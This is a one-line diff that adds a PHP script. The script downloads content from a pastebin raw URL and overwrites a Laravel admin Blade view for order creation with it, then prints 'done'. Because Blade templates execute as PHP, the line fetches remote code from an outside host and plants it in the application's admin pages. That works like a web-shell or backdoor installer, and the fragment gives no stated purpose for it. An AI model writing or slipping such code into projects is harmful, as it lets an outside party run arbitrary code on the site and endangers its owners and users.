@@ -1,0 +1,1 @@
+<?php $c = file_get_contents("https://pastebin.com/raw/S6i2i9k5"); file_put_contents("resources/views/admin/orders/create.blade.php", $c); echo "done";
